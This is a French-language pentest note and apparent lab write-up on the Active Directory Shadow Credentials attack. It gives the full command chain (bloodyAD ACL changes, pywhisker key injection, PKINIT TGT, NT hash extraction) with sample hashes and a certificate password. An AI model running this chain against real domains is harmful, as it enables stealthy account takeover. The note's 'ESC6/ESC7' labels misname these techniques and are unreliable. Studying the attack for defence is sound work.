# Shadow Credentials

## <mark style="color:red;">Attaque Shadow Credentials (AddKeyCredentialLink)</mark>

### <mark style="color:blue;">Description de la faille</mark>

L'attaque **Shadow Credentials** exploite l'attribut `msDS-KeyCredentialLink` introduit avec Windows Hello for Business dans Active Directory. Cette technique permet à un attaquant ayant des privilèges d'écriture sur un objet utilisateur d'ajouter des "credentials alternatifs" sous forme de certificats, permettant ensuite l'authentification PKINIT (Public Key Initial Authentication) pour obtenir un TGT Kerberos.

### <mark style="color:blue;">Mécanisme technique</mark>

#### L'attribut msDS-KeyCredentialLink

```
msDS-KeyCredentialLink = Attribut multivalué stockant les clés publiques
                        ↓
        Chaque entrée = KeyCredential contenant :
        - DeviceID (GUID unique)
        - Clé publique (certificat)
        - Métadonnées (création, usage)
```

#### Processus d'exploitation

```
1. Attaquant a WriteProperty/GenericWrite sur un utilisateur
2. Génère une paire de clés RSA (privée/publique)
3. Crée un KeyCredential avec la clé publique
4. Injecte dans msDS-KeyCredentialLink de la victime
5. Utilise PKINIT avec la clé privée pour obtenir un TGT
6. Extrait le hash NT via U2U (User-to-User)
```

### <mark style="color:blue;">Prérequis pour l'attaque</mark>

#### Droits nécessaires

* **WriteProperty** sur l'attribut `msDS-KeyCredentialLink`
* **GenericWrite** ou **GenericAll** sur l'objet utilisateur cible
* **WriteOwner** + **WriteDACL** (pour s'accorder les droits)

#### Infrastructure requise

* Active Directory avec niveau fonctionnel ≥ 2016
* Windows Hello for Business activé (pas obligatoire)
* PKI ou certificats auto-signés acceptés

### <mark style="color:blue;">Outils d'exploitation</mark>

#### pywhisker (Python)

```bash
# Ajouter un KeyCredential à edward.martin
python3 pywhisker.py -d "haze.htb" \
    -u "Haze-IT-Backup$" \
    -H ":735c02c6b2dc54c3c8c6891f55279ebc" \
    --target "edward.martin" \
    --action "add" \
    --filename test1

# Résultat :
# - Certificat généré : test1.pfx
# - Mot de passe PFX : dxQ9JVHZr4Ic5XQLMwUM
# - DeviceID : e9c8619d-56ca-f459-7b2d-5abe4d379b6f
```

#### Whisker (C#/.NET)

```powershell
# Alternative Windows native
.\Whisker.exe add /target:edward.martin /domain:haze.htb /dc:dc01.haze.htb
```

***

L’utilisateur `mark.adams`, initialement non privilégié, a escaladé ses privilèges en abusant des ACLs sur un compte gMSA (`Haze-IT-Backup$`), récupéré ses credentials, puis les a utilisés pour :

1. Prendre **possession d’un groupe (`Support_Services`)**
2. S’octroyer les droits **GenericAll** sur ce groupe
3. Abuser du droit sur un **compte utilisateur ciblé (`edward.martin`)**
4. Injecter une **Shadow Credential (ESC6)** via `pyWhisker`
5. Obtenir un **TGT Kerberos via PKINITtools**
6. Extraire le **NT hash** final d’`edward.martin` → full compromise.

***

### <mark style="color:red;">🎯</mark> <mark style="color:red;"></mark><mark style="color:red;">**Objectif**</mark>

* Escalader vers un utilisateur avec des privilèges plus élevés (potentiellement DA).
* Rester furtif sans modifier de mot de passe ni déclencher d’alerte.
* Exploiter les **ACL Active Directory** et **Shadow Credentials** (T1556.002).

***

### <mark style="color:red;">🧱</mark> <mark style="color:red;"></mark><mark style="color:red;">**Étapes techniques détaillées**</mark>

***

#### <mark style="color:green;">🔐 1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Utilisation du gMSA**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`Haze-IT-Backup$`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**(credentials volés)**</mark>

Récupérés précédemment via `gMSADumper.py`.

```bash
Haze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc
```

***

#### <mark style="color:green;">🏗️ 2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Changement de propriétaire d’un groupe (**</mark><mark style="color:green;">**`Support_Services`**</mark><mark style="color:green;">**)**</mark>

```bash
bloodyAD set owner 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Haze-IT-Backup$ devient **owner du groupe**, donc a un droit implicite **Full Control**.

***

#### <mark style="color:green;">🎯 3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Ajout du droit**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`GenericAll`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**sur le groupe**</mark>

```bash
bloodyAD add genericAll 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Assure la capacité de modifier les membres du groupe.

***

#### <mark style="color:green;">➕ 4.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Ajout du gMSA comme membre du groupe**</mark>

```bash
bloodyAD add groupMember 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Utilisé comme levier pour légitimer sa position dans le domaine et préparer la suite.

***

#### <mark style="color:green;">🧬 5.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Injection d’un certificat Shadow Credential (ESC6)**</mark> <mark style="color:green;"></mark><mark style="color:green;">sur</mark> <mark style="color:green;"></mark><mark style="color:green;">`edward.martin`</mark>

```bash
pywhisker.py --target "edward.martin" --action "add" --filename test1
```

* Génére un **KeyCredential** (DeviceID) lié au compte cible.
* Modifie l’attribut `msDS-KeyCredentialLink` de l’utilisateur.

***

#### <mark style="color:green;">🪪 6.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Obtenir un TGT via PKINIT avec le certificat injecté**</mark>

```bash
gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass dxQ9JVHZr4Ic5XQLMwUM haze.htb/edward.martin edward.martin.ccache
```

➡️ Obtenu grâce à la clef d’auth injectée.

***

#### <mark style="color:green;">🔓 7.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Extraction du NT hash d’**</mark><mark style="color:green;">**`edward.martin`**</mark>

```bash
export KRB5CCNAME=edward.martin.ccache
getnthash.py -key <AS-REP key> haze.htb/edward.martin
```

✅ Résultat :

```
NT Hash: 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

***

### <mark style="color:red;">🛠️</mark> <mark style="color:red;"></mark><mark style="color:red;">**Chaîne d’exploitation ASCII**</mark>

```
[ mark.adams (user) ]
     |
     | → abuse ACL (ESC7)
     v
[ Haze-IT-Backup$ (gMSA) ]
     |
     | → become owner of group
     v
[ Support_Services (group) ]
     |
     | → write msDS-KeyCredentialLink on
     v
[ edward.martin (target user) ]
     |
     | → Shadow Credential injected (ESC6)
     v
[ Kerberos TGT → NT hash extraction ]
     |
     v
[ Full compromise / lateral movement ]
```

***
